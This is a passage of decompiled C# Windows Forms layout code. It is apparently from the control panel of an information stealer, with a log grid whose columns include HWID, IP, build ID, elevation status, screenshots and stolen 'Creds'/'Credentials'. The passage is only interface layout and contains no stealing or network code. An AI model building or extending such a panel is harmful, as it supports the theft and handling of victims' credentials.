		((System.Windows.Forms.Control)this.label38).Name = "label38";
		((System.Windows.Forms.Control)this.label38).Size = new System.Drawing.Size(62, 15);
		((System.Windows.Forms.Control)this.label38).TabIndex = 110;
		((System.Windows.Forms.Control)this.label38).Text = "Total logs:";
		((System.Windows.Forms.Label)this.label38).TextAlign = System.Drawing.ContentAlignment.MiddleCenter;
		((System.Windows.Forms.Control)this.totalPages).AutoSize = true;
		((System.Windows.Forms.Control)this.totalPages).Font = new System.Drawing.Font("Segoe UI", 9f, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, 204);
		((System.Windows.Forms.Control)this.totalPages).ForeColor = System.Drawing.Color.FromArgb(200, 200, 200);
		((System.Windows.Forms.Control)this.totalPages).Location = new System.Drawing.Point(320, 590);
		((System.Windows.Forms.Control)this.totalPages).Name = "totalPages";
		((System.Windows.Forms.Control)this.totalPages).Size = new System.Drawing.Size(13, 15);
		((System.Windows.Forms.Control)this.totalPages).TabIndex = 109;
		((System.Windows.Forms.Control)this.totalPages).Text = "0";
		((System.Windows.Forms.Label)this.totalPages).TextAlign = System.Drawing.ContentAlignment.MiddleCenter;
		((System.Windows.Forms.Control)this.totalPagesLbl).AutoSize = true;
		((System.Windows.Forms.Control)this.totalPagesLbl).Font = new System.Drawing.Font("Segoe UI", 9f, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, 204);
		((System.Windows.Forms.Control)this.totalPagesLbl).ForeColor = System.Drawing.Color.FromArgb(200, 200, 200);
		((System.Windows.Forms.Control)this.totalPagesLbl).Location = new System.Drawing.Point(235, 590);
		((System.Windows.Forms.Control)this.totalPagesLbl).Name = "totalPagesLbl";
		((System.Windows.Forms.Control)this.totalPagesLbl).Size = new System.Drawing.Size(71, 15);
		((System.Windows.Forms.Control)this.totalPagesLbl).TabIndex = 108;
		((System.Windows.Forms.Control)this.totalPagesLbl).Text = "Total pages:";
		((System.Windows.Forms.Label)this.totalPagesLbl).TextAlign = System.Drawing.ContentAlignment.MiddleCenter;
		((System.Windows.Forms.Control)this.currentPage).AutoSize = true;
		((System.Windows.Forms.Control)this.currentPage).Font = new System.Drawing.Font("Segoe UI", 9f, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, 204);
		((System.Windows.Forms.Control)this.currentPage).ForeColor = System.Drawing.Color.FromArgb(200, 200, 200);
		((System.Windows.Forms.Control)this.currentPage).Location = new System.Drawing.Point(320, 616);
		((System.Windows.Forms.Control)this.currentPage).Name = "currentPage";
		((System.Windows.Forms.Control)this.currentPage).Size = new System.Drawing.Size(13, 15);
		((System.Windows.Forms.Control)this.currentPage).TabIndex = 107;
		((System.Windows.Forms.Control)this.currentPage).Text = "0";
		((System.Windows.Forms.Label)this.currentPage).TextAlign = System.Drawing.ContentAlignment.MiddleCenter;
		((System.Windows.Forms.Control)this.currentPageLbl).AutoSize = true;
		((System.Windows.Forms.Control)this.currentPageLbl).Font = new System.Drawing.Font("Segoe UI", 9f, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, 204);
		((System.Windows.Forms.Control)this.currentPageLbl).ForeColor = System.Drawing.Color.FromArgb(200, 200, 200);
		((System.Windows.Forms.Control)this.currentPageLbl).Location = new System.Drawing.Point(235, 616);
		((System.Windows.Forms.Control)this.currentPageLbl).Name = "currentPageLbl";
		((System.Windows.Forms.Control)this.currentPageLbl).Size = new System.Drawing.Size(79, 15);
		((System.Windows.Forms.Control)this.currentPageLbl).TabIndex = 106;
		((System.Windows.Forms.Control)this.currentPageLbl).Text = "Current page:";
		((System.Windows.Forms.Label)this.currentPageLbl).TextAlign = System.Drawing.ContentAlignment.MiddleCenter;
		((AnimaTextBox)this.pageNumberTb).Dark = false;
		((System.Windows.Forms.Control)this.pageNumberTb).Location = new System.Drawing.Point(184, 610);
		((AnimaTextBox)this.pageNumberTb).MaxLength = 32767;
		((AnimaTextBox)this.pageNumberTb).MultiLine = false;
		((System.Windows.Forms.Control)this.pageNumberTb).Name = "pageNumberTb";
		((AnimaTextBox)this.pageNumberTb).Numeric = false;
		((AnimaTextBox)this.pageNumberTb).ReadOnly = false;
		((System.Windows.Forms.Control)this.pageNumberTb).Size = new System.Drawing.Size(26, 23);
		((System.Windows.Forms.Control)this.pageNumberTb).TabIndex = 105;
		((AnimaTextBox)this.pageNumberTb).UseSystemPasswordChar = false;
		((MetroSetButton)this.goToPageBtn).DisabledBackColor = System.Drawing.Color.FromArgb(120, 65, 177, 225);
		((MetroSetButton)this.goToPageBtn).DisabledBorderColor = System.Drawing.Color.FromArgb(120, 65, 177, 225);
		((MetroSetButton)this.goToPageBtn).DisabledForeColor = System.Drawing.Color.Gray;
		((System.Windows.Forms.Control)this.goToPageBtn).Font = new System.Drawing.Font("Microsoft Sans Serif", 10f);
		((MetroSetButton)this.goToPageBtn).HoverBorderColor = System.Drawing.Color.FromArgb(95, 207, 255);
		((MetroSetButton)this.goToPageBtn).HoverColor = System.Drawing.Color.FromArgb(95, 207, 255);
		((MetroSetButton)this.goToPageBtn).HoverTextColor = System.Drawing.Color.White;
		((System.Windows.Forms.Control)this.goToPageBtn).Location = new System.Drawing.Point(103, 611);
		((System.Windows.Forms.Control)this.goToPageBtn).Name = "goToPageBtn";
		((MetroSetButton)this.goToPageBtn).NormalBorderColor = System.Drawing.Color.FromArgb(65, 177, 225);
		((MetroSetButton)this.goToPageBtn).NormalColor = System.Drawing.Color.FromArgb(65, 177, 225);
		((MetroSetButton)this.goToPageBtn).NormalTextColor = System.Drawing.Color.White;
		((MetroSetButton)this.goToPageBtn).PressBorderColor = System.Drawing.Color.FromArgb(35, 147, 195);
		((MetroSetButton)this.goToPageBtn).PressColor = System.Drawing.Color.FromArgb(35, 147, 195);
		((MetroSetButton)this.goToPageBtn).PressTextColor = System.Drawing.Color.White;
		((System.Windows.Forms.Control)this.goToPageBtn).Size = new System.Drawing.Size(75, 23);
		((MetroSetButton)this.goToPageBtn).Style = (Style)0;
		((MetroSetButton)this.goToPageBtn).StyleManager = null;
		((System.Windows.Forms.Control)this.goToPageBtn).TabIndex = 104;
		((System.Windows.Forms.Control)this.goToPageBtn).Text = "Go to Page";
		((MetroSetButton)this.goToPageBtn).ThemeAuthor = "Narwin";
		((MetroSetButton)this.goToPageBtn).ThemeName = "MetroLite";
		((System.Windows.Forms.Control)this.goToPageBtn).Click += new System.EventHandler(goToPageBtn_Click);
		((MetroSetButton)this.backPageBtn).DisabledBackColor = System.Drawing.Color.FromArgb(120, 65, 177, 225);
		((MetroSetButton)this.backPageBtn).DisabledBorderColor = System.Drawing.Color.FromArgb(120, 65, 177, 225);
		((MetroSetButton)this.backPageBtn).DisabledForeColor = System.Drawing.Color.Gray;
		((System.Windows.Forms.Control)this.backPageBtn).Font = new System.Drawing.Font("Microsoft Sans Serif", 10f);
		((MetroSetButton)this.backPageBtn).HoverBorderColor = System.Drawing.Color.FromArgb(95, 207, 255);
		((MetroSetButton)this.backPageBtn).HoverColor = System.Drawing.Color.FromArgb(95, 207, 255);
		((MetroSetButton)this.backPageBtn).HoverTextColor = System.Drawing.Color.White;
		((System.Windows.Forms.Control)this.backPageBtn).Location = new System.Drawing.Point(37, 611);
		((System.Windows.Forms.Control)this.backPageBtn).Name = "backPageBtn";
		((MetroSetButton)this.backPageBtn).NormalBorderColor = System.Drawing.Color.FromArgb(65, 177, 225);
		((MetroSetButton)this.backPageBtn).NormalColor = System.Drawing.Color.FromArgb(65, 177, 225);
		((MetroSetButton)this.backPageBtn).NormalTextColor = System.Drawing.Color.White;
		((MetroSetButton)this.backPageBtn).PressBorderColor = System.Drawing.Color.FromArgb(35, 147, 195);
		((MetroSetButton)this.backPageBtn).PressColor = System.Drawing.Color.FromArgb(35, 147, 195);
		((MetroSetButton)this.backPageBtn).PressTextColor = System.Drawing.Color.White;
		((System.Windows.Forms.Control)this.backPageBtn).Size = new System.Drawing.Size(27, 23);
		((MetroSetButton)this.backPageBtn).Style = (Style)0;
		((MetroSetButton)this.backPageBtn).StyleManager = null;
		((System.Windows.Forms.Control)this.backPageBtn).TabIndex = 38;
		((System.Windows.Forms.Control)this.backPageBtn).Text = "<<";
		((MetroSetButton)this.backPageBtn).ThemeAuthor = "Narwin";
		((MetroSetButton)this.backPageBtn).ThemeName = "MetroLite";
		((System.Windows.Forms.Control)this.backPageBtn).Click += new System.EventHandler(backPageBtn_Click);
		((MetroSetButton)this.nextPageBtn).DisabledBackColor = System.Drawing.Color.FromArgb(120, 65, 177, 225);
		((MetroSetButton)this.nextPageBtn).DisabledBorderColor = System.Drawing.Color.FromArgb(120, 65, 177, 225);
		((MetroSetButton)this.nextPageBtn).DisabledForeColor = System.Drawing.Color.Gray;
		((System.Windows.Forms.Control)this.nextPageBtn).Font = new System.Drawing.Font("Microsoft Sans Serif", 10f);
		((MetroSetButton)this.nextPageBtn).HoverBorderColor = System.Drawing.Color.FromArgb(95, 207, 255);
		((MetroSetButton)this.nextPageBtn).HoverColor = System.Drawing.Color.FromArgb(95, 207, 255);
		((MetroSetButton)this.nextPageBtn).HoverTextColor = System.Drawing.Color.White;
		((System.Windows.Forms.Control)this.nextPageBtn).Location = new System.Drawing.Point(70, 611);
		((System.Windows.Forms.Control)this.nextPageBtn).Name = "nextPageBtn";
		((MetroSetButton)this.nextPageBtn).NormalBorderColor = System.Drawing.Color.FromArgb(65, 177, 225);
		((MetroSetButton)this.nextPageBtn).NormalColor = System.Drawing.Color.FromArgb(65, 177, 225);
		((MetroSetButton)this.nextPageBtn).NormalTextColor = System.Drawing.Color.White;
		((MetroSetButton)this.nextPageBtn).PressBorderColor = System.Drawing.Color.FromArgb(35, 147, 195);
		((MetroSetButton)this.nextPageBtn).PressColor = System.Drawing.Color.FromArgb(35, 147, 195);
		((MetroSetButton)this.nextPageBtn).PressTextColor = System.Drawing.Color.White;
		((System.Windows.Forms.Control)this.nextPageBtn).Size = new System.Drawing.Size(27, 23);
		((MetroSetButton)this.nextPageBtn).Style = (Style)0;
		((MetroSetButton)this.nextPageBtn).StyleManager = null;
		((System.Windows.Forms.Control)this.nextPageBtn).TabIndex = 37;
		((System.Windows.Forms.Control)this.nextPageBtn).Text = ">>";
		((MetroSetButton)this.nextPageBtn).ThemeAuthor = "Narwin";
		((MetroSetButton)this.nextPageBtn).ThemeName = "MetroLite";
		((System.Windows.Forms.Control)this.nextPageBtn).Click += new System.EventHandler(nextPageBtn_Click);
		((MetroSetButton)this.cb).DisabledBackColor = System.Drawing.Color.FromArgb(120, 65, 177, 225);
		((MetroSetButton)this.cb).DisabledBorderColor = System.Drawing.Color.FromArgb(120, 65, 177, 225);
		((MetroSetButton)this.cb).DisabledForeColor = System.Drawing.Color.Gray;
		((System.Windows.Forms.Control)this.cb).Font = new System.Drawing.Font("Microsoft Sans Serif", 10f);
		((MetroSetButton)this.cb).HoverBorderColor = System.Drawing.Color.FromArgb(95, 207, 255);
		((MetroSetButton)this.cb).HoverColor = System.Drawing.Color.FromArgb(95, 207, 255);
		((MetroSetButton)this.cb).HoverTextColor = System.Drawing.Color.White;
		((System.Windows.Forms.Control)this.cb).Location = new System.Drawing.Point(964, 586);
		((System.Windows.Forms.Control)this.cb).Name = "searchBtn";
		((MetroSetButton)this.cb).NormalBorderColor = System.Drawing.Color.FromArgb(65, 177, 225);
		((MetroSetButton)this.cb).NormalColor = System.Drawing.Color.FromArgb(65, 177, 225);
		((MetroSetButton)this.cb).NormalTextColor = System.Drawing.Color.White;
		((MetroSetButton)this.cb).PressBorderColor = System.Drawing.Color.FromArgb(35, 147, 195);
		((MetroSetButton)this.cb).PressColor = System.Drawing.Color.FromArgb(35, 147, 195);
		((MetroSetButton)this.cb).PressTextColor = System.Drawing.Color.White;
		((System.Windows.Forms.Control)this.cb).Size = new System.Drawing.Size(98, 23);
		((MetroSetButton)this.cb).Style = (Style)0;
		((MetroSetButton)this.cb).StyleManager = null;
		((System.Windows.Forms.Control)this.cb).TabIndex = 36;
		((System.Windows.Forms.Control)this.cb).Text = "Search";
		((MetroSetButton)this.cb).ThemeAuthor = "Narwin";
		((MetroSetButton)this.cb).ThemeName = "MetroLite";
		((System.Windows.Forms.Control)this.cb).Click += new System.EventHandler(cb_Click);
		((AnimaTextBox)this.cc).Dark = false;
		((System.Windows.Forms.Control)this.cc).Location = new System.Drawing.Point(524, 587);
		((AnimaTextBox)this.cc).MaxLength = 32767;
		((AnimaTextBox)this.cc).MultiLine = false;
		((System.Windows.Forms.Control)this.cc).Name = "searchTb";
		((AnimaTextBox)this.cc).Numeric = false;
		((AnimaTextBox)this.cc).ReadOnly = false;
		((System.Windows.Forms.Control)this.cc).Size = new System.Drawing.Size(434, 23);
		((System.Windows.Forms.Control)this.cc).TabIndex = 35;
		((AnimaTextBox)this.cc).UseSystemPasswordChar = false;
		((System.Windows.Forms.Control)this.cd).AutoSize = true;
		((System.Windows.Forms.Control)this.cd).Font = new System.Drawing.Font("Segoe UI", 9f, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, 204);
		((System.Windows.Forms.Control)this.cd).ForeColor = System.Drawing.Color.FromArgb(200, 200, 200);
		((System.Windows.Forms.Control)this.cd).Location = new System.Drawing.Point(417, 590);
		((System.Windows.Forms.Control)this.cd).Name = "label4";
		((System.Windows.Forms.Control)this.cd).Size = new System.Drawing.Size(72, 15);
		((System.Windows.Forms.Control)this.cd).TabIndex = 34;
		((System.Windows.Forms.Control)this.cd).Text = "Search filter:";
		((MetroSetButton)this.clearBtn).DisabledBackColor = System.Drawing.Color.FromArgb(120, 65, 177, 225);
		((MetroSetButton)this.clearBtn).DisabledBorderColor = System.Drawing.Color.FromArgb(120, 65, 177, 225);
		((MetroSetButton)this.clearBtn).DisabledForeColor = System.Drawing.Color.Gray;
		((System.Windows.Forms.Control)this.clearBtn).Font = new System.Drawing.Font("Microsoft Sans Serif", 10f);
		((MetroSetButton)this.clearBtn).HoverBorderColor = System.Drawing.Color.FromArgb(95, 207, 255);
		((MetroSetButton)this.clearBtn).HoverColor = System.Drawing.Color.FromArgb(95, 207, 255);
		((MetroSetButton)this.clearBtn).HoverTextColor = System.Drawing.Color.White;
		((System.Windows.Forms.Control)this.clearBtn).Location = new System.Drawing.Point(1065, 611);
		((System.Windows.Forms.Control)this.clearBtn).Name = "clearBtn";
		((MetroSetButton)this.clearBtn).NormalBorderColor = System.Drawing.Color.FromArgb(65, 177, 225);
		((MetroSetButton)this.clearBtn).NormalColor = System.Drawing.Color.FromArgb(65, 177, 225);
		((MetroSetButton)this.clearBtn).NormalTextColor = System.Drawing.Color.White;
		((MetroSetButton)this.clearBtn).PressBorderColor = System.Drawing.Color.FromArgb(35, 147, 195);
		((MetroSetButton)this.clearBtn).PressColor = System.Drawing.Color.FromArgb(35, 147, 195);
		((MetroSetButton)this.clearBtn).PressTextColor = System.Drawing.Color.White;
		((System.Windows.Forms.Control)this.clearBtn).Size = new System.Drawing.Size(98, 23);
		((MetroSetButton)this.clearBtn).Style = (Style)0;
		((MetroSetButton)this.clearBtn).StyleManager = null;
		((System.Windows.Forms.Control)this.clearBtn).TabIndex = 33;
		((System.Windows.Forms.Control)this.clearBtn).Text = "Clear all logs";
		((MetroSetButton)this.clearBtn).ThemeAuthor = "Narwin";
		((MetroSetButton)this.clearBtn).ThemeName = "MetroLite";
		((System.Windows.Forms.Control)this.clearBtn).Click += new System.EventHandler(clearBtn_Click);
		((MetroSetButton)this.saveBtn).DisabledBackColor = System.Drawing.Color.FromArgb(120, 65, 177, 225);
		((MetroSetButton)this.saveBtn).DisabledBorderColor = System.Drawing.Color.FromArgb(120, 65, 177, 225);
		((MetroSetButton)this.saveBtn).DisabledForeColor = System.Drawing.Color.Gray;
		((System.Windows.Forms.Control)this.saveBtn).Font = new System.Drawing.Font("Microsoft Sans Serif", 10f);
		((MetroSetButton)this.saveBtn).HoverBorderColor = System.Drawing.Color.FromArgb(95, 207, 255);
		((MetroSetButton)this.saveBtn).HoverColor = System.Drawing.Color.FromArgb(95, 207, 255);
		((MetroSetButton)this.saveBtn).HoverTextColor = System.Drawing.Color.White;
		((System.Windows.Forms.Control)this.saveBtn).Location = new System.Drawing.Point(1065, 586);
		((System.Windows.Forms.Control)this.saveBtn).Name = "saveBtn";
		((MetroSetButton)this.saveBtn).NormalBorderColor = System.Drawing.Color.FromArgb(65, 177, 225);
		((MetroSetButton)this.saveBtn).NormalColor = System.Drawing.Color.FromArgb(65, 177, 225);
		((MetroSetButton)this.saveBtn).NormalTextColor = System.Drawing.Color.White;
		((MetroSetButton)this.saveBtn).PressBorderColor = System.Drawing.Color.FromArgb(35, 147, 195);
		((MetroSetButton)this.saveBtn).PressColor = System.Drawing.Color.FromArgb(35, 147, 195);
		((MetroSetButton)this.saveBtn).PressTextColor = System.Drawing.Color.White;
		((System.Windows.Forms.Control)this.saveBtn).Size = new System.Drawing.Size(98, 23);
		((MetroSetButton)this.saveBtn).Style = (Style)0;
		((MetroSetButton)this.saveBtn).StyleManager = null;
		((System.Windows.Forms.Control)this.saveBtn).TabIndex = 32;
		((System.Windows.Forms.Control)this.saveBtn).Text = "Save all logs";
		((MetroSetButton)this.saveBtn).ThemeAuthor = "Narwin";
		((MetroSetButton)this.saveBtn).ThemeName = "MetroLite";
		((System.Windows.Forms.Control)this.saveBtn).Click += new System.EventHandler(saveBtn_Click);
		((MetroSetButton)this.setCommentBtn).DisabledBackColor = System.Drawing.Color.FromArgb(120, 65, 177, 225);
		((MetroSetButton)this.setCommentBtn).DisabledBorderColor = System.Drawing.Color.FromArgb(120, 65, 177, 225);
		((MetroSetButton)this.setCommentBtn).DisabledForeColor = System.Drawing.Color.Gray;
		((System.Windows.Forms.Control)this.setCommentBtn).Font = new System.Drawing.Font("Microsoft Sans Serif", 10f);
		((MetroSetButton)this.setCommentBtn).HoverBorderColor = System.Drawing.Color.FromArgb(95, 207, 255);
		((MetroSetButton)this.setCommentBtn).HoverColor = System.Drawing.Color.FromArgb(95, 207, 255);
		((MetroSetButton)this.setCommentBtn).HoverTextColor = System.Drawing.Color.White;
		((System.Windows.Forms.Control)this.setCommentBtn).Location = new System.Drawing.Point(964, 611);
		((System.Windows.Forms.Control)this.setCommentBtn).Name = "setCommentBtn";
		((MetroSetButton)this.setCommentBtn).NormalBorderColor = System.Drawing.Color.FromArgb(65, 177, 225);
		((MetroSetButton)this.setCommentBtn).NormalColor = System.Drawing.Color.FromArgb(65, 177, 225);
		((MetroSetButton)this.setCommentBtn).NormalTextColor = System.Drawing.Color.White;
		((MetroSetButton)this.setCommentBtn).PressBorderColor = System.Drawing.Color.FromArgb(35, 147, 195);
		((MetroSetButton)this.setCommentBtn).PressColor = System.Drawing.Color.FromArgb(35, 147, 195);
		((MetroSetButton)this.setCommentBtn).PressTextColor = System.Drawing.Color.White;
		((System.Windows.Forms.Control)this.setCommentBtn).Size = new System.Drawing.Size(98, 23);
		((MetroSetButton)this.setCommentBtn).Style = (Style)0;
		((MetroSetButton)this.setCommentBtn).StyleManager = null;
		((System.Windows.Forms.Control)this.setCommentBtn).TabIndex = 31;
		((System.Windows.Forms.Control)this.setCommentBtn).Text = "Set";
		((MetroSetButton)this.setCommentBtn).ThemeAuthor = "Narwin";
		((MetroSetButton)this.setCommentBtn).ThemeName = "MetroLite";
		((System.Windows.Forms.Control)this.setCommentBtn).Click += new System.EventHandler(setCommentBtn_Click);
		((AnimaTextBox)this.commentTb).Dark = false;
		((System.Windows.Forms.Control)this.commentTb).Location = new System.Drawing.Point(524, 612);
		((AnimaTextBox)this.commentTb).MaxLength = 32767;
		((AnimaTextBox)this.commentTb).MultiLine = false;
		((System.Windows.Forms.Control)this.commentTb).Name = "commentTb";
		((AnimaTextBox)this.commentTb).Numeric = false;
		((AnimaTextBox)this.commentTb).ReadOnly = false;
		((System.Windows.Forms.Control)this.commentTb).Size = new System.Drawing.Size(434, 23);
		((System.Windows.Forms.Control)this.commentTb).TabIndex = 30;
		((AnimaTextBox)this.commentTb).UseSystemPasswordChar = false;
		((System.Windows.Forms.Control)this.label1).AutoSize = true;
		((System.Windows.Forms.Control)this.label1).Font = new System.Drawing.Font("Segoe UI", 9f, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, 204);
		((System.Windows.Forms.Control)this.label1).ForeColor = System.Drawing.Color.FromArgb(200, 200, 200);
		((System.Windows.Forms.Control)this.label1).Location = new System.Drawing.Point(417, 616);
		((System.Windows.Forms.Control)this.label1).Name = "label1";
		((System.Windows.Forms.Control)this.label1).Size = new System.Drawing.Size(101, 15);
		((System.Windows.Forms.Control)this.label1).TabIndex = 26;
		((System.Windows.Forms.Control)this.label1).Text = "Enter a comment:";
		((System.Windows.Forms.DataGridView)this.logsListView).AllowUserToAddRows = false;
		((System.Windows.Forms.DataGridView)this.logsListView).AllowUserToDeleteRows = false;
		((System.Windows.Forms.DataGridView)this.logsListView).AllowUserToOrderColumns = true;
		((System.Windows.Forms.DataGridView)this.logsListView).AllowUserToResizeRows = false;
		dataGridViewCellStyle.Alignment = System.Windows.Forms.DataGridViewContentAlignment.MiddleCenter;
		dataGridViewCellStyle.BackColor = System.Drawing.Color.FromArgb(52, 60, 67);
		dataGridViewCellStyle.Font = new System.Drawing.Font("Segoe UI", 9f);
		dataGridViewCellStyle.ForeColor = System.Drawing.Color.Silver;
		dataGridViewCellStyle.WrapMode = System.Windows.Forms.DataGridViewTriState.False;
		((System.Windows.Forms.DataGridView)this.logsListView).AlternatingRowsDefaultCellStyle = dataGridViewCellStyle;
		((System.Windows.Forms.DataGridView)this.logsListView).AutoGenerateColumns = false;
		((System.Windows.Forms.DataGridView)this.logsListView).AutoSizeRowsMode = System.Windows.Forms.DataGridViewAutoSizeRowsMode.AllCells;
		((System.Windows.Forms.DataGridView)this.logsListView).BackgroundColor = System.Drawing.Color.FromArgb(52, 60, 67);
		((System.Windows.Forms.DataGridView)this.logsListView).BorderStyle = System.Windows.Forms.BorderStyle.None;
		((System.Windows.Forms.DataGridView)this.logsListView).CellBorderStyle = System.Windows.Forms.DataGridViewCellBorderStyle.RaisedVertical;
		((System.Windows.Forms.DataGridView)this.logsListView).ClipboardCopyMode = System.Windows.Forms.DataGridViewClipboardCopyMode.Disable;
		((System.Windows.Forms.DataGridView)this.logsListView).ColumnHeadersBorderStyle = System.Windows.Forms.DataGridViewHeaderBorderStyle.Single;
		dataGridViewCellStyle2.Alignment = System.Windows.Forms.DataGridViewContentAlignment.MiddleCenter;
		dataGridViewCellStyle2.BackColor = System.Drawing.Color.FromArgb(58, 62, 73);
		dataGridViewCellStyle2.Font = new System.Drawing.Font("Segoe UI", 9f);
		dataGridViewCellStyle2.ForeColor = System.Drawing.Color.Silver;
		dataGridViewCellStyle2.SelectionBackColor = System.Drawing.SystemColors.Highlight;
		dataGridViewCellStyle2.SelectionForeColor = System.Drawing.SystemColors.HighlightText;
		dataGridViewCellStyle2.WrapMode = System.Windows.Forms.DataGridViewTriState.True;
		((System.Windows.Forms.DataGridView)this.logsListView).ColumnHeadersDefaultCellStyle = dataGridViewCellStyle2;
		((System.Windows.Forms.DataGridView)this.logsListView).ColumnHeadersHeightSizeMode = System.Windows.Forms.DataGridViewColumnHeadersHeightSizeMode.DisableResizing;
		((System.Windows.Forms.DataGridView)this.logsListView).Columns.AddRange((System.Windows.Forms.DataGridViewColumn)this.iDDataGridViewTextBoxColumn, (System.Windows.Forms.DataGridViewColumn)this.hWIDDataGridViewTextBoxColumn, (System.Windows.Forms.DataGridViewColumn)this.iPDataGridViewTextBoxColumn, (System.Windows.Forms.DataGridViewColumn)this.buildIDDataGridViewTextBoxColumn, (System.Windows.Forms.DataGridViewColumn)this.usernameDataGridViewTextBoxColumn, (System.Windows.Forms.DataGridViewColumn)this.isProcessElevatedDataGridViewCheckBoxColumn, (System.Windows.Forms.DataGridViewColumn)this.currentLanguageDataGridViewTextBoxColumn, (System.Windows.Forms.DataGridViewColumn)this.monitorSizeDataGridViewTextBoxColumn, (System.Windows.Forms.DataGridViewColumn)this.logDateDataGridViewTextBoxColumn, (System.Windows.Forms.DataGridViewColumn)this.uacTypeDataGridViewTextBoxColumn, (System.Windows.Forms.DataGridViewColumn)this.countryDataGridViewTextBoxColumn, (System.Windows.Forms.DataGridViewColumn)this.SeenBefore, (System.Windows.Forms.DataGridViewColumn)this.Checked, (System.Windows.Forms.DataGridViewColumn)this.locationDataGridViewTextBoxColumn, (System.Windows.Forms.DataGridViewColumn)this.timeZoneDataGridViewTextBoxColumn, (System.Windows.Forms.DataGridViewColumn)this.screenshotDataGridViewImageColumn, (System.Windows.Forms.DataGridViewColumn)this.Comment, (System.Windows.Forms.DataGridViewColumn)this.Creds, (System.Windows.Forms.DataGridViewColumn)this.pDDDataGridViewTextBoxColumn, (System.Windows.Forms.DataGridViewColumn)this.cDDDataGridViewTextBoxColumn, (System.Windows.Forms.DataGridViewColumn)this.Credentials);
		((System.Windows.Forms.Control)this.logsListView).ContextMenuStrip = (System.Windows.Forms.ContextMenuStrip)this.logContextMenu;
		((System.Windows.Forms.DataGridView)this.logsListView).DataSource = this.object_17;
		dataGridViewCellStyle3.Alignment = System.Windows.Forms.DataGridViewContentAlignment.MiddleCenter;
		dataGridViewCellStyle3.BackColor = System.Drawing.Color.FromArgb(58, 62, 73);
		dataGridViewCellStyle3.Font = new System.Drawing.Font("Segoe UI", 9f);
		dataGridViewCellStyle3.ForeColor = System.Drawing.Color.FromArgb(52, 56, 67);
		dataGridViewCellStyle3.SelectionBackColor = System.Drawing.SystemColors.Highlight;
		dataGridViewCellStyle3.SelectionForeColor = System.Drawing.SystemColors.HighlightText;
		dataGridViewCellStyle3.WrapMode = System.Windows.Forms.DataGridViewTriState.False;
		((System.Windows.Forms.DataGridView)this.logsListView).DefaultCellStyle = dataGridViewCellStyle3;
		((System.Windows.Forms.DataGridView)this.logsListView).EditMode = System.Windows.Forms.DataGridViewEditMode.EditOnEnter;
		((System.Windows.Forms.DataGridView)this.logsListView).EnableHeadersVisualStyles = false;
		((System.Windows.Forms.DataGridView)this.logsListView).GridColor = System.Drawing.Color.FromArgb(52, 60, 67);
		((System.Windows.Forms.Control)this.logsListView).Location = new System.Drawing.Point(4, 19);
		((System.Windows.Forms.Control)this.logsListView).Name = "logsListView";
		((System.Windows.Forms.DataGridView)this.logsListView).ReadOnly = true;
		((System.Windows.Forms.DataGridView)this.logsListView).RowHeadersBorderStyle = System.Windows.Forms.DataGridViewHeaderBorderStyle.Sunken;
		dataGridViewCellStyle4.Alignment = System.Windows.Forms.DataGridViewContentAlignment.MiddleCenter;
		dataGridViewCellStyle4.BackColor = System.Drawing.Color.FromArgb(52, 56, 67);
		dataGridViewCellStyle4.Font = new System.Drawing.Font("Segoe UI", 9f);
		dataGridViewCellStyle4.ForeColor = System.Drawing.Color.Silver;
		dataGridViewCellStyle4.SelectionBackColor = System.Drawing.SystemColors.Highlight;
		dataGridViewCellStyle4.SelectionForeColor = System.Drawing.SystemColors.HighlightText;
		dataGridViewCellStyle4.WrapMode = System.Windows.Forms.DataGridViewTriState.True;
		((System.Windows.Forms.DataGridView)this.logsListView).RowHeadersDefaultCellStyle = dataGridViewCellStyle4;
		((System.Windows.Forms.DataGridView)this.logsListView).RowHeadersVisible = false;
		((System.Windows.Forms.DataGridView)this.logsListView).RowHeadersWidthSizeMode = System.Windows.Forms.DataGridViewRowHeadersWidthSizeMode.DisableResizing;
		dataGridViewCellStyle5.Alignment = System.Windows.Forms.DataGridViewContentAlignment.MiddleCenter;
		dataGridViewCellStyle5.BackColor = System.Drawing.Color.FromArgb(52, 60, 67);
		dataGridViewCellStyle5.ForeColor = System.Drawing.Color.Silver;
		((System.Windows.Forms.DataGridView)this.logsListView).RowsDefaultCellStyle = dataGridViewCellStyle5;
		((System.Windows.Forms.DataGridView)this.logsListView).RowTemplate.DefaultCellStyle.Alignment = System.Windows.Forms.DataGridViewContentAlignment.MiddleCenter;
		((System.Windows.Forms.DataGridView)this.logsListView).RowTemplate.DefaultCellStyle.BackColor = System.Drawing.Color.FromArgb(52, 56, 67);
		((System.Windows.Forms.DataGridView)this.logsListView).RowTemplate.DefaultCellStyle.ForeColor = System.Drawing.Color.Silver;
		((System.Windows.Forms.DataGridView)this.logsListView).SelectionMode = System.Windows.Forms.DataGridViewSelectionMode.FullRowSelect;
		((System.Windows.Forms.DataGridView)this.logsListView).ShowEditingIcon = false;
		((System.Windows.Forms.Control)this.logsListView).Size = new System.Drawing.Size(1159, 555);
		((System.Windows.Forms.Control)this.logsListView).TabIndex = 15;
		((System.Windows.Forms.DataGridView)this.logsListView).VirtualMode = true;
		((System.Windows.Forms.DataGridView)this.logsListView).DataError += new System.Windows.Forms.DataGridViewDataErrorEventHandler(logsListView_DataError);
		((System.Windows.Forms.DataGridView)this.logsListView).SelectionChanged += new System.EventHandler(logsListView_SelectionChanged);
		((System.Windows.Forms.DataGridViewColumn)this.iDDataGridViewTextBoxColumn).DataPropertyName = "ID";
		((System.Windows.Forms.DataGridViewColumn)this.iDDataGridViewTextBoxColumn).HeaderText = "ID";
		((System.Windows.Forms.DataGridViewColumn)this.iDDataGridViewTextBoxColumn).Name = "iDDataGridViewTextBoxColumn";
		((System.Windows.Forms.DataGridViewBand)this.iDDataGridViewTextBoxColumn).ReadOnly = true;
		((System.Windows.Forms.DataGridViewColumn)this.iDDataGridViewTextBoxColumn).Width = 70;
		((System.Windows.Forms.DataGridViewColumn)this.hWIDDataGridViewTextBoxColumn).DataPropertyName = "HWID";
		((System.Windows.Forms.DataGridViewColumn)this.hWIDDataGridViewTextBoxColumn).HeaderText = "HWID";
		((System.Windows.Forms.DataGridViewColumn)this.hWIDDataGridViewTextBoxColumn).Name = "hWIDDataGridViewTextBoxColumn";
